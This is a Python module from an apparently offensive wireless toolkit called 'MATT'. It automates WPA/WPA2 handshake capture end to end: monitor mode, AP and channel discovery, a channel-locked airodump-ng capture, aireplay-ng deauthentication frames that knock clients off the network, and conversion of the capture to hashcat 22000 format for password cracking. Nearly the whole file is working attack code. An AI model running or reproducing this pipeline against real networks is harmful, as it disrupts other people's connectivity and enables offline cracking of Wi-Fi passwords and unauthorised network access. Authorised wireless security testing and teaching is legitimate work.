"""matt.wifi -- WPA/WPA2 handshake capture with a deauth trigger.

Capturing a WPA handshake is a different job from the managed-mode ARP MITM the
rest of MATT does: it needs a MONITOR-mode adapter, the aircrack-ng suite, and
(to force a fast handshake) a deauth that kicks a client off so it reconnects.
This module builds and orchestrates that pipeline; the captured handshake is
converted to the hashcat 22000 format MATT already understands, so it flows
straight into analyze/crack.

Standard-library only. The external tools (airmon-ng, airodump-ng, aireplay-ng,
hcxpcapngtool) are invoked as subprocesses, never imported. The command builders
are pure and testable; nothing here runs until orchestrate() is called.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import time

__all__ = [
    "TOOLS", "missing_tools", "monitor_up", "monitor_down", "set_channel",
    "scan_cmd", "parse_scan", "channel_for", "scan",
    "capture", "deauth", "convert_22000", "plan", "orchestrate",
    "DEFAULT_SCAN_CHANNELS", "dwell_scan", "best_channel_by_activity",
]

# The channels worth dwelling on for a quick busiest-channel scan: the three
# non-overlapping 2.4 GHz channels plus the common 5 GHz UNII-1/UNII-3 ones.
# Not exhaustive (a full 1-165 sweep would take far longer for little extra
# signal), but it is where the overwhelming majority of real devices sit.
DEFAULT_SCAN_CHANNELS = [1, 6, 11, 36, 40, 44, 48, 149, 153, 157, 161]

# The external tools this pipeline needs, and what each is for. Monitor mode is
# driven with iw/ip (in place, no renamed *mon interface) rather than airmon-ng:
# the in-kernel USB Wi-Fi drivers (rtw89, mt76, ...) keep the same interface
# name and airmon-ng's "wlan1mon" is never created, so an iw-based setup is what
# actually works on them -- and iw/ip ship with every Linux.
TOOLS = {
    "iw": "set monitor mode and lock the channel",
    "ip": "bring the interface down/up around the mode change",
    "airodump-ng": "capture the 802.11 handshake",
    "aireplay-ng": "send the deauth that forces a reconnect",
    "hcxpcapngtool": "convert the .cap to hashcat 22000",
}


def _which_incl_sbin(tool: str) -> "str | None":
    """shutil.which, but also looks in the sbin dirs. The Wi-Fi tools (iw,
    airodump-ng, aireplay-ng) live in /usr/sbin and /sbin, which are often not on
    a normal user's PATH even though the tools are installed and run fine under
    sudo -- so a plain which() would wrongly report them missing."""
    found = shutil.which(tool)
    if found:
        return found
    for d in ("/usr/sbin", "/sbin", "/usr/local/sbin"):
        cand = os.path.join(d, tool)
        if os.path.isfile(cand) and os.access(cand, os.X_OK):
            return cand
    return None


def missing_tools(which=None) -> list:
    """Which required tools are not installed (install: aircrack-ng + hcxtools;
    iw/ip are in iproute2/iw and almost always already present). Looks in the
    sbin dirs too, since that is where the Wi-Fi tools usually live."""
    which = which or _which_incl_sbin
    return [t for t in TOOLS if not which(t)]


def monitor_up(iface: str, sudo: str = "sudo") -> list:
    """Commands to put ``iface`` into monitor mode in place (same name). Returns
    a list of command lists: down, set type monitor, up."""
    return [
        [sudo, "ip", "link", "set", iface, "down"],
        [sudo, "iw", "dev", iface, "set", "type", "monitor"],
        [sudo, "ip", "link", "set", iface, "up"],
    ]


def monitor_down(iface: str, sudo: str = "sudo") -> list:
    """Commands to drop monitor mode and restore managed networking on ``iface``."""
    return [
        [sudo, "ip", "link", "set", iface, "down"],
        [sudo, "iw", "dev", iface, "set", "type", "managed"],
        [sudo, "ip", "link", "set", iface, "up"],
    ]


def set_channel(iface: str, channel, sudo: str = "sudo") -> list:
    """Command to lock a monitor interface to one channel (2.4 or 5 GHz)."""
    return [sudo, "iw", "dev", iface, "set", "channel", str(channel)]


def scan_cmd(iface: str, sudo: str = "sudo") -> list:
    """Command to scan for nearby APs on a MANAGED interface (not the monitor
    one -- scanning needs managed mode). Feed its output to parse_scan()."""
    return [sudo, "iw", "dev", iface, "scan"]


def _freq_to_channel(mhz: int) -> "int | None":
    """802.11 frequency (MHz) -> channel number, for 2.4 GHz and 5 GHz."""
    if mhz == 2484:
        return 14
    if 2412 <= mhz <= 2472:
        return (mhz - 2407) // 5
    if 5000 <= mhz <= 5900:
        return (mhz - 5000) // 5
    return None


def parse_scan(text: str) -> list:
    """Parse `iw dev <iface> scan` output into a list of
    {bssid, ssid, freq, channel, signal} dicts, strongest signal first."""
    aps: list = []
    cur: dict = {}
    for line in (text or "").splitlines():
        s = line.strip()
        m = re.match(r"BSS ([0-9a-fA-F:]{17})", s)
        if m:
            if cur.get("bssid"):
                aps.append(cur)
            cur = {"bssid": m.group(1).lower(), "ssid": "", "freq": None,
                   "channel": None, "signal": None}
        elif s.startswith("freq:"):
            try:
                cur["freq"] = int(float(s.split(":", 1)[1].strip()))
                cur["channel"] = _freq_to_channel(cur["freq"])
            except ValueError:
                pass
        elif s.startswith("signal:"):
            try:
                cur["signal"] = float(s.split(":", 1)[1].strip().split()[0])
            except (ValueError, IndexError):
                pass
        elif s.startswith("DS Parameter set: channel"):
            try:
                cur["channel"] = int(s.rsplit("channel", 1)[1].strip())
            except ValueError:
                pass
        elif s.startswith("SSID:"):
            cur["ssid"] = s[5:].strip()
    if cur.get("bssid"):
        aps.append(cur)
    aps.sort(key=lambda a: (a["signal"] is None, -(a["signal"] or -999)))
    return aps


def channel_for(aps: list, bssid: str = None, ssid: str = None) -> "int | None":
    """The channel of the target AP: matched by BSSID if given, else the
    strongest AP with the given SSID. None if not found."""
    if bssid:
        b = bssid.lower()
        for a in aps:
            if a.get("bssid") == b:
                return a.get("channel")
        return None
    if ssid is not None:
        for a in aps:                       # aps are strongest-first
            if a.get("ssid") == ssid and a.get("channel"):
                return a.get("channel")
    return None


def scan(mon_iface: str, sudo: str = "sudo") -> list:
    """Deprecated alias kept for compatibility: list nearby APs with airodump-ng.
    Prefer scan_cmd()/parse_scan() on a managed interface."""
    return [sudo, "airodump-ng", mon_iface]


def list_aps(iface: str, runner=None) -> list:
    """Scan on ``iface`` and return nearby APs (strongest first). The interface
    is put back to managed mode first, because scanning needs managed mode --
    so this works even if the adapter was left in monitor mode by a prior run."""
    runner = runner or (lambda cmd: subprocess.run(cmd, capture_output=True,
                                                    text=True, timeout=30, check=False))
    for cmd in monitor_down(iface):
        runner(cmd)
    res = runner(scan_cmd(iface))
    return parse_scan(getattr(res, "stdout", "") or "")


def find_channel(iface: str, bssid: str = None, ssid: str = None,
                 runner=None) -> "int | None":
    """Auto-detect the target AP's channel by scanning on ``iface`` -- so the
    operator never has to look it up. Matches by BSSID, else the strongest AP
    with the given SSID."""
    return channel_for(list_aps(iface, runner=runner), bssid=bssid, ssid=ssid)


def capture(mon_iface: str, bssid: str, channel, prefix: str,
            sudo: str = "sudo") -> list:
    """Command to lock to one AP's channel and write the handshake to PREFIX*."""
    return [sudo, "airodump-ng", "-c", str(channel), "--bssid", bssid,
            "-w", prefix, mon_iface]


def deauth(mon_iface: str, bssid: str, client: str = None, count: int = 5,
           sudo: str = "sudo") -> list:
    """Command to send ``count`` deauth frames (to a client, or broadcast) so a
    station reconnects and its 4-way handshake can be captured. count=0 is a
    continuous deauth -- disruptive, so MATT defaults to a short burst."""
    cmd = [sudo, "aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(mon_iface)
    return cmd


def convert_22000(cap_file: str, out_file: str) -> list:
    """Command to convert a captured .cap/.pcapng into hashcat 22000 candidates."""
    return ["hcxpcapngtool", "-o", out_file, cap_file]


def plan(iface: str, bssid: str, channel, client: str = None, count: int = 5,
         prefix: str = "matt-wpa", out: str = "matt-wpa.22000") -> list:
    """The ordered recipe (list of (label, command) pairs) for a handshake
    capture: monitor on (iw), lock the channel, channel-locked capture, deauth
    trigger, convert to 22000, monitor off. The single source of truth for both
    --wpa --dry-run and orchestrate(); monitor mode is set in place on ``iface``
    (no renamed *mon interface)."""
    steps = [("monitor on", cmd) for cmd in monitor_up(iface)]
    steps.append(("set channel", set_channel(iface, channel)))
    steps.append(("capture", capture(iface, bssid, channel, prefix)))
    steps.append(("deauth", deauth(iface, bssid, client, count)))
    steps.append(("convert", convert_22000(prefix + "-01.cap", out)))
    steps += [("monitor off", cmd) for cmd in monitor_down(iface)]
    return steps


def dwell_scan(iface: str, channel, seconds: float = 1.5, runner=None,
              capture_runner=None, which=None) -> dict:
    """Lock a monitor-mode ``iface`` to ``channel`` and count 802.11 frames and
    distinct transmitting devices seen over ``seconds`` -- a direct measure of
    how busy that channel actually is, not just how many APs advertise on it.

    Prefers tshark (reads the wlan.sa field, so devices are counted exactly);
    falls back to a plain tcpdump frame count (via the ``timeout`` coreutil,
    since tcpdump has no built-in duration flag) when tshark is missing, with
    devices reported equal to frames since MACs are not parsed in that path.
    Returns ``{"channel", "frames", "devices"}`` either way, including an
    all-zero result if neither tool is available or the run itself errors.
    """
    runner = runner or (lambda cmd: subprocess.run(cmd, capture_output=True,
                                                    text=True, timeout=30, check=False))
    capture_runner = capture_runner or (lambda cmd, timeout: subprocess.run(
        cmd, capture_output=True, text=True, timeout=timeout, check=False))
    which = which or _which_incl_sbin
    runner(set_channel(iface, channel))
    tshark = which("tshark")
    if tshark:
        try:
            res = capture_runner(
                [tshark, "-i", iface, "-a", "duration:%s" % seconds,
                 "-T", "fields", "-e", "wlan.sa"], seconds + 15)
        except subprocess.SubprocessError:
            return {"channel": channel, "frames": 0, "devices": 0}
        macs = [m for m in (getattr(res, "stdout", "") or "").split()
                if m and m != "ff:ff:ff:ff:ff:ff"]
        return {"channel": channel, "frames": len(macs), "devices": len(set(macs))}
    tcpdump = which("tcpdump")
    timeout_bin = which("timeout")
    if tcpdump and timeout_bin:
        dwell = max(1, int(round(seconds)))
        try:
            res = capture_runner(
                [timeout_bin, str(dwell), tcpdump, "-i", iface, "-nn"], seconds + 15)
        except subprocess.SubprocessError:
            return {"channel": channel, "frames": 0, "devices": 0}
        text = (getattr(res, "stdout", "") or "") + (getattr(res, "stderr", "") or "")
        frames = sum(1 for ln in text.splitlines() if ln.strip())
        return {"channel": channel, "frames": frames, "devices": frames}
    return {"channel": channel, "frames": 0, "devices": 0}


def best_channel_by_activity(iface: str, channels=None, dwell: float = 1.5,
                             on_progress=None, runner=None, capture_runner=None,
                             which=None) -> list:
    """Hop ``iface`` across ``channels`` (default DEFAULT_SCAN_CHANNELS),
    dwelling on each for ``dwell`` seconds, and rank them by distinct devices
    seen transmitting -- the busiest channel is the best pick for a
    monitor-mode adapter doing passive sniffing (the most traffic to see).

    Puts ``iface`` into monitor mode for the scan and always restores managed
    mode afterwards, even on error. ``on_progress(i, total, channel)`` fires
    right before each dwell, so a caller can render a progress bar. Returns a
    list of ``{"channel","frames","devices"}``, busiest first.
    """
    channels = list(channels or DEFAULT_SCAN_CHANNELS)
    runner = runner or (lambda cmd: subprocess.run(cmd, capture_output=True,
                                                    text=True, timeout=30, check=False))
    for cmd in monitor_up(iface):
        runner(cmd)
    results = []
    try:
        total = len(channels)
        for i, ch in enumerate(channels, 1):
            if on_progress:
                on_progress(i, total, ch)
            results.append(dwell_scan(iface, ch, seconds=dwell, runner=runner,
                                      capture_runner=capture_runner, which=which))
    finally:
        for cmd in monitor_down(iface):
            runner(cmd)
    results.sort(key=lambda r: (r["devices"], r["frames"]), reverse=True)
    return results


def orchestrate(iface: str, bssid: str, channel, client: str = None, count: int = 5,
                prefix: str = "matt-wpa", out: str = "matt-wpa.22000",
                capture_secs: float = 20.0, runner=None, popen=None,
                which=None) -> dict:
    """Run the handshake capture for real: set ``iface`` to monitor mode in place,
    lock its channel, start the channel-locked capture in the background, fire a
    short deauth, let it run, stop, convert, and restore managed mode.

    ``runner`` (default subprocess.run) and ``popen`` (default subprocess.Popen)
    are injectable so tests drive the whole flow without a radio. Returns a dict
    with the 22000 output path and per-step status; never raises for a tool that
    is missing -- that is a line in the result.
    """
    runner = runner or (lambda cmd: subprocess.run(cmd, capture_output=True,
                                                    text=True, timeout=30, check=False))
    popen = popen or (lambda cmd: subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                                   stderr=subprocess.DEVNULL,
                                                   stdin=subprocess.DEVNULL,
                                                   start_new_session=True))
    result = {"steps": [], "out": out, "ok": False}
    gone = missing_tools(which or shutil.which)
    if gone:
        result["error"] = "missing tools: " + ", ".join(gone)
        return result

    for cmd in monitor_up(iface):
        runner(cmd)
    runner(set_channel(iface, channel))
    result["steps"].append("monitor on, channel %s" % channel)
    cap = popen(capture(iface, bssid, channel, prefix))
    result["steps"].append("capture started")
    try:
        time.sleep(1.0)
        runner(deauth(iface, bssid, client, count))
        result["steps"].append("deauth sent")
        time.sleep(max(1.0, capture_secs))
    finally:
        try:
            cap.terminate()
            cap.wait(timeout=5)
        except Exception:
            pass
        result["steps"].append("capture stopped")
    runner(convert_22000(prefix + "-01.cap", out))
    result["steps"].append("converted")
    result["ok"] = os.path.exists(out)
    for cmd in monitor_down(iface):
        runner(cmd)
    result["steps"].append("monitor off")
    return result
